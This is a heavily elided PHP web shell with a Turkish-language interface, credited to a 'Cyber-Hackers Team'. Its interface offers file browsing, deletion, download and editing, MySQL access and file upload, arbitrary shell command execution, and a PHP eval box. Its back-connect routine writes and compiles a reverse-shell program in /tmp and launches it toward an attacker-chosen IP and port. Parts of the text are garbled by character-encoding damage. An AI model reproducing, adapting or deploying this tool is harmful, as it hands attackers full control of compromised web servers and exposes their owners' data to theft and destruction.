...
??tc??h???&#250;Sniper\SuperdHei\kEvin1986\saiy\wofeiwoc
	...
	if (!$dbname) {
		...
		if (!file_exists($mysqldlfile)) {
			...
			if(!$result){
				...
				//????4????,?G?????????__kodk3rMuro_1111111111_eof__????h?????
...
<table width="100%" border="0" cellpadding="0" cellspacing="0">
	<tr class="head">
		<td><span style="float:right;"><a href="http://www.TeknoWbh.Com" target="_blank"><?php echo str_replace('.','','#Root@Suikast.?');?> Version: 2010</a></span><?php echo $_SERVER['HTTP_HOST'];?> (<?php echo gethostbyname($_SERVER['SERVER_NAME']);?>)</td>
	</tr>
	<tr class="alt1">
		<td><span style="float:right;">Guvenli Mod:<?php echo getcfg('safe_mode');?></span>
			<a href="javascript:goaction('logout');">C??</a> | 
...
if (!$action || $action == 'file') {
	...
	if ($doing == 'deldir' && $thefile) {
		if (!file_exists($thefile)) {
			...
			m('Directory delete '.(deltree($thefile) ? basename($thefile).' Hos Geldiniz' : 'failed'));
		}
	}
	...
	elseif($doing == 'delfiles') {
		if ($dl) {
			...
			m('Deleted file have finished&#236;choose '.count($dl).' success '.$succ.' fail '.$fail);
		} else {
			m('Please select file(s)');
		}
	}
...
<table width="100%" border="0" cellpadding="0" cellspacing="0" style="margin:10px 0;">
  ...
  <tr>
    <td nowrap>Gecerl??zin (<?php echo $dir_writeable;?>, <?php echo getChmod($nowpath);?>)</td>
...
function godir(dir,view_writable){
  ...
  <?php
	...
	if ($view_writable) {
		...
		p(' | <a href="javascript:godir(\''.$nowpath.'\',\'1\');">Gorme Yazilabilir</a>');
	}
	p(' | <a href="javascript:createdir();">Rehbet Olusturma</a> | <a href="javascript:createfile(\''.$nowpath.'\');">Dosya Olustur</a>');
	if (IS_WIN && IS_COM) {
	...
	p('<tr class="head"><td>&nbsp;</td><td>Dosya Adi</td><td width="16%">Son Degistirme</td><td width="10%">Size</td><td width="20%">Izinmod / Perm</td><td width="22%">Secenek</td></tr>');
	...
	foreach($dirdata as $key => $dirdb){
		if($dirdb['filename']!='..' && $dirdb['filename']!='.') {
			...
			p('<td nowrap><a href="javascript:dofile(\'deldir\',\''.$dirdb['server_link'].'\',\'Are you sure will delete '.$dirdb['filename'].'? \\n\\nIf non-empty directory, will be delete all the files.\')">Sil</a> | <a href="javascript:rename(\''.$dirdb['server_link'].'\');">Komut Gir</a></td>');
			p('</tr>');
			$dir_i++;
		} else {
			if($dirdb['filename']=='..') {
	...
	foreach($filedata as $key => $filedb){
		if($filedb['filename']!='..' && $filedb['filename']!='.') {
			...
			p('<td nowrap>');
			p('<a href="javascript:dofile(\'downfile\',\''.$filedb['server_link'].'\');">INDIR</a> | ');
			...
			p('<a href="javascript:rename(\''.$filedb['server_link'].'\');">Komut Gir</a> | ');
			p('<a href="javascript:opfile(\'newtime\',\''.$filedb['server_link'].'\',\''.$filedb['dirlink'].'\');">Degistir</a>');
			p('</td></tr>');
			$file_i++;
		}
	}
	p('<tr class="'.bg().'"><td align="center"><input name="chkall" value="on" type="checkbox" onclick="CheckAll(this.form)" /></td><td><a href="javascript:dofile(\'downrar\');">Secili Olani INDIR</a> - <a href="javascript:dofile(\'delfiles\');">Secili Olani Sil</a></td><td colspan="4" align="right">'.$dir_i.' dizinler / '.$file_i.' resimler</td></tr>');
	p('</form></table>');
}// end dir
...
t';
	...
	formhead(array('title'=>'MYSQL Bilgi','name'=>'dbinfo'));
	...
	p('<h2>Upload file</h2>');
	p('<p><b>DB kullan??gerekir Bu i?? DOSYA ayr????a sahiptir</b></p>');
	p('<p>Save path(fullpath): <input class="input" name="savepath" size="45" type="text" /> Choose a file: <input class="input" name="uploadfile" type="file" /> <a href="javascript:mysqlfile(\'mysqlupload\');">Upload</a></p>');
	p('<h2>INDIRME Dosyasi</h2>');
...
elseif ($action == 'sqladmin') {
	...
	formhead(array('title'=>'MYSQL Yonetici'));
...
elseif ($action == 'backconnect') {
	...
	if ($start && $yourip && $yourport && $use){
		if ($use == 'perl') {
			cf('/tmp/kodk3rMuro_bc',$back_connect);
			$res = execute(which('perl')." /tmp/kodk3rMuro_bc $yourip $yourport &");
		} else {
			cf('/tmp/kodk3rMuro_bc.c',$back_connect_c);
			$res = execute('gcc -o /tmp/kodk3rMuro_bc /tmp/kodk3rMuro_bc.c');
			@unlink('/tmp/kodk3rMuro_bc.c');
			$res = execute("/tmp/kodk3rMuro_bc $yourip $yourport &");
		}
		m("Now script try connect to $yourip port $yourport ...");
	}

	formhead(array('title'=>'Geri Baglanyin!'));
...
elseif ($action == 'eval') {
	...
	formhead(array('title'=>'Eval PHP Kod'));
	makehide('action','eval');
	maketext(array('title'=>'PHP Code','name'=>'phpcode', 'value'=>$phpcode));
	p('<p><a href="http://www.teknowbh.com/phpmuro/plugin/" target="_blank">Eklenti Alan</a></p>');
	formfooter();
}//end eval
...
elseif ($action == 'editfile') {
	...
	formhead(array('title'=>'Dosya / D??le Olustur'));
	makehide('action','file');
	makehide('dir',$nowpath);
	makeinput(array('title'=>'Ge?li dosya (ithalat yeni bir dosya ad?? yeni bir dosya)','name'=>'editfilename','value'=>$opfile,'newline'=>1));
	maketext(array('title'=>'Dosya Icerik','name'=>'filecontent','value'=>$contents));
	formfooter();
}//end editfile
...
elseif ($action == 'shell') {
	...
	formhead(array('title'=>'Yurutme Komutu'));
	makehide('action','shell');
	if (IS_WIN && IS_COM) {
	...
	p('<p>');
	makeinput(array('title'=>'Komut','name'=>'command','value'=>$command));
	makeinput(array('name'=>'submit','class'=>'bt','type'=>'submit','value'=>'Execute'));
	p('</p>');
	formfoot();
...
elseif ($action == 'phpenv') {
	...
	formhead(array('title'=>'Sunucu Ortami'));
	makehide('action','phpenv');
	makeinput(array('title'=>'Giris PHP konfig??yon parametresi L??n (?? magic_quotes_gpc)','name'=>'phpvarname','value'=>$phpvarname,'newline'=>1));
	formfooter();
...
<div style="padding:10px;border-bottom:1px solid #fff;border-top:1px solid #ddd;background:#eee;">
	...
	Copyright (C) 2010-2011 <a href="http://www.TeknoWbh.Com" target="_blank">Security Cyber-Hackers Team [Rasim#..]</a> T??aklar??kl??.
</div>
</body>
</html>
...
function debuginfo() {
	...
	echo 'Islenmis Icinde '.$totaltime.' second(s)';
}
